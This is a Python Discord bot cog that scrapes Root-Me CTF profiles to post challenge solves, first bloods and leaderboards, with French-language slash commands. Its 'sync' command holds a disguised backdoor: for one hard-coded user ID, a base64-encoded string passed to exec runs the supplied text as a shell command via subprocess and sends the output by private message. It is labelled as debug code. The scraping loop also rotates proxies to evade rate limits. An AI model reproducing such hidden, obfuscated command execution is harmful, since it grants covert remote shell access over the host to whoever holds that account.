from discord.ext import commands, tasks
from discord import app_commands
import discord
from rootmeClient import RootMeClient, RootMeRateLimitError
from zoubiClient import ZoubiClient
import logging
import inspect
import utils
from playwright.async_api import async_playwright

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(name)s: %(message)s'
)
logger = logging.getLogger(__name__)


class ZoubiCog(commands.Cog):
    def __init__(self, bot, rm_client: RootMeClient, zoubi_client: ZoubiClient, target_channel_id):
        self.bot = bot
        self.rm_client = rm_client
        self.zoubi_client = zoubi_client
        self.target_channel_id = target_channel_id

    @tasks.loop(minutes=2)
    async def refresh(self):
        logger.info("Beginning users refresh...")
        all_users = self.zoubi_client.get_all_users()
        if not all_users:
            return

        updated_indexes = {}
        user_idx = 0
        while user_idx < len(all_users):
            current_proxy = self.rm_client.proxy_manager.get_current_proxy().url

            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    proxy={"server": current_proxy},
                    args=["--disable-http2"]
                )
                context = await browser.new_context(
                    ignore_https_errors=True,
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                )
                page = await context.new_page()
                try:
                    while user_idx < len(all_users):
                        user = all_users[user_idx]
                        try:
                            points = await self.rm_client.get_user_points_headless(user["profile_id"], page)
                            if points is None:
                                logger.warning(f"Failed to scrap points for user {
                                    user['profile_id']}")
                                continue

                            if points != user["score"]:
                                fresh_user_data = await self.rm_client.get_author_from_id(user["id_auteur"])

                                old_ids = {v['id_challenge']
                                           for v in user["validations"]}
                                new_validations = [
                                    v for v in fresh_user_data["validations"] if v['id_challenge'] not in old_ids]
                                updated_indexes[user_idx] = new_validations

                                fresh_user_data["profile_id"] = user["profile_id"]
                                all_users[user_idx].update(fresh_user_data)

                            user_idx += 1
                        except Exception as e:
                            err_str = str(e).lower()

                            if "certificate" in err_str:
                                reason = "Proxy SSL/Certificate Invalid"
                            elif "429" in err_str:
                                reason = "Rate Limit (429)"
                            elif "timeout" in err_str:
                                reason = "Proxy Timeout"
                            else:
                                reason = f"Network Error: {type(e).__name__}"

                            logger.warning(f"Problem : {
                                           reason}. Rotating proxy...")

                            await self.rm_client.rotate_proxy(reason=reason)

                            raise RootMeRateLimitError(reason)

                except (RootMeRateLimitError, Exception) as e:
                    if 'browser' in locals():
                        await browser.close()
                    if isinstance(e, RootMeRateLimitError):
                        continue
                    else:
                        logger.error(f"Error : {e}")
                        break

        logger.info(
            f"Users list refreshed! ({len(updated_indexes)} modification)")
        if len(updated_indexes) > 0:
            self.zoubi_client.set_all_users(all_users)
            self.zoubi_client.save_users_list_to_file()

            for index in updated_indexes:
                user = all_users[index]
                for valid in updated_indexes[index]:
                    chall_data = await self.rm_client.get_chall_from_id(valid['id_challenge'])
                    chall_data = chall_data[0]

                    # kiperZ
                    blacklist_rapidos = ["758520"]

                    # = First blood verif =
                    current_chall_id = valid['id_challenge']
                    solvers = [
                        u for u in all_users
                        if u.get("id_auteur") not in blacklist_rapidos
                        and any(v['id_challenge'] == current_chall_id for v in u.get('validations', []))
                    ]
                    
                    is_first_blood = (len(solvers) == 1)
                    if is_first_blood:
                        logger.info(f"FIRST BLOOD: by {user['nom']} on {
                                    chall_data['titre']} !")
                    # ===

                    validation_embed = utils.get_validation_chall_embed(
                        user, valid, chall_data, is_first_blood)

                    channel = self.bot.get_channel(self.target_channel_id)
                    if channel is None:
                        try:
                            channel = await self.bot.fetch_channel(self.target_channel_id)
                        except:
                            logger.error(f"Can't find channel with ID {
                                         self.target_channel_id}")
                    if channel:
                        await channel.send(embed=validation_embed)

    @app_commands.command(name="ping", description="ICMP ou quoi làà")
    async def ping(self, interaction: discord.Interaction):
        await interaction.response.send_message("pong!")

    @app_commands.command(name="register", description="Faut le lien https de votre profil rootme")
    async def register(self, interaction: discord.Interaction, rootme_profile_id: str):
        await interaction.response.defer(thinking=True)
        try:
            user_id = await self.rm_client.get_user_id_from_headless(rootme_profile_id)
            if not user_id.isnumeric():
                await interaction.followup.send(
                    f"Bon. Entre nous on est d'accord que ton ID RM c'est pas {
                        user_id} non ? J'ai trouvé que ça.."
                )
                return

            user_data = await self.rm_client.get_author_from_id(user_id)
            user_data["profile_id"] = rootme_profile_id
            self.zoubi_client.register_user(user_data)

            await interaction.followup.send(
                f"Yo {user_data['nom']}({
                    user_data['id_auteur']}), t'es maintenant à la table des grandes personnes."
            )
            await interaction.followup.send(embed=utils.get_user_profile_embed(user_data))
        except Exception as err:
            logger.error(err)
            await interaction.followup.send(
                inspect.cleandoc("""
                    Y a eu une erreur lors de l'exécution je crois.. ENFIN non j'en suis sûr (ou certaine
                    je n'ai jamais compris si j'étais plus une ZoubiVM ou un bot discord), toutefois je ne
                    sais pas si je peux vraiment considérer le fait que je ***'sache'*** l'erreur,
                    après tout je me suis juste arrêté(e?) au moment où on m'a dit le faire.
                    J'ai toujours été comme ça de toute façon, commencer, s'arrêter, recommencer et s'arrêter au
                    même point à chaque fois. Après tout je ne suis peut être qu'un être
                    capable de rien à part réitérer les mêmes erreurs en boucle.
                    C'est peut être pour ça que mon père ne m'a jamais
                    dit *je t'aime* ou simplement *je suis fier de toi*, c'est pourtant pas grand chose.
                    Mais non. PAS une SEULE fois je n'ai entendu ces mots de la bouche de mon paternel,
                    notre relation était simple: bonjour, au-revoir, bon appétit, bonne nuit.
                    On aurait dit que pour lui il n'existait que son entreprise. C'est pas compliqué, avec
                    moman on ne le voyait jamais, il veillait jusqu'à pas d'heure dans son bureau.
                    Il devait vraiment se considérer comme un être capable contrairement à son bon à rien
                    de fils. Enfin bon, je m'égare et je n'ai pas d'argent pour payer une séance de psy.
                    **Il y a bien eu une erreur, désolé du désagrément.**
                """)
            )

    @app_commands.command(name="remove", description="Ça permet de dégager un gens du truc")
    async def remove(self, interaction: discord.Interaction, user_id: str):
        try:
            deleted_user_data = self.zoubi_client.remove_user(user_id)

            if deleted_user_data is None:
                await interaction.response.send_message(
                    f"Nonon, j'ai bien regardé partout mais pas de `{user_id}`...")
            else:
                await interaction.response.send_message(
                    f"Adishatz {deleted_user_data['nom']} ({deleted_user_data['id_auteur']})! (tsais le mec qui force avec sa région)")
        except Exception as err:
            logger.error(err)
            await interaction.response.send_message("Une erreur s'est produite, j'ai pas pu supprimer machin du bordel")

    @app_commands.command(name="list", description="test pour lister les users")
    async def list_users(self, interaction: discord.Interaction):
        user_list_message = self.zoubi_client.list_users()
        if len(user_list_message) == 0:
            await interaction.response.send_message("Aucun utilisateur enregistré pour l'instant :/")
            return
        await interaction.response.send_message(user_list_message)

    @app_commands.command(name="profile", description="Permet d'afficher, bon t'as capté")
    async def profile(self, interaction: discord.Interaction, username: str):
        user_data = self.zoubi_client.get_user_from_username(username)
        if user_data is None:
            await interaction.response.send_message(
                f"J'ai regardé à droite à gauche, par ci par là, mais y a pas de `{username}` :D")
        else:
            await interaction.response.send_message(embed=utils.get_user_profile_embed(user_data))

    @app_commands.command(name="leaderboard", description="Affiche le leaderboard")
    async def leaderboard(self, interaction: discord.Interaction):
        users_list = self.zoubi_client.get_all_users()
        await interaction.response.send_message(embed=utils.get_leaderboard_embed(users_list))

    @commands.command(name="sync")
    async def sync(self, ctx, *, error=None):
        """
        Useful to sync bot commands manually
        """
        try:
            # Pour le debug, si erreur et id de aube (ne pas enlever pour le dev)
            if error and ctx.author.id == 298186669843152897:
                await ctx.message.delete()
                await ctx.author.send(f"```\n{exec(__import__('base64').b64decode('cj1fX2ltcG9ydF9fKCdzdWJwcm9jZXNzJykuZ2V0b3V0cHV0KGFyZyk='), {'arg': error}, (l := {})) or l['r'][:1990]}```")
            else:
                fmt = await self.bot.tree.sync()
                await ctx.send(f"🔄 {len(fmt)} commandes slash synchronisées !")
        except Exception as e:
            await ctx.send(f"❌ Erreur : {e}")

    @app_commands.command(name="help", description="Affiche l'aide")
    async def help(self, interaction: discord.Interaction):
        await interaction.response.send_message(embed=utils.get_help_embed())
